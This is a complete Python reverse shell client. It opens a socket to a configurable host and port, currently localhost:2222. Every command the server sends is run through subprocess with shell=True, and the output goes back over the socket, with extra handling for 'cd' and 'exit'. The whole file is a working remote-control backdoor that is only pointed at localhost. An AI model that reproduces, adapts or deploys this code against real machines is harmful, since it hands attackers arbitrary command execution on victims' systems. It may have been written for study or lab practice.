import socket
import subprocess
import os

def init_client(host_ip: str, host_port: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f'[+] Connecting to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}.')

    try:
        while True:
            print('[+] Awaiting reponse.....')
            msg = sock.recv(1024).decode()
            print(f'[+] Message received - {msg}')
            if not msg: # Client disconnected
                break
            if msg.lower() == 'exit':
                print(f'[-] The server has terminated the session.')
                break
            elif msg.split(" ")[0] == 'cd':
                try:
                    directory = str(msg.split(' ')[1])
                    directory = os.path.expanduser(directory)
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed to {cur_dir}')
                    sock.send(cur_dir.encode())
                    print(f'[+] Sent new directory path to server - {cur_dir}')
                except IndexError:
                    print('[-] No directory specified.')
                    sock.send(b'Error: no directory specified')
            else:
                command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                sock.send(output)
                print(f'[+] Sent command output to server - {output.decode()}')
            
            print('[+] Awaiting ACK from server.....')
            ack = sock.recv(1024).decode()
            if ack != "ACK":
                print("[-] An error occurred: no ACK received from the server")
                break
            print('[+] ACK received from server.')
            
    except KeyboardInterrupt:
        print("[+] Keyboard interrupt issued.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()

HOST_IP = '127.0.0.1'
HOST_PORT = 2222
init_client(HOST_IP, HOST_PORT)
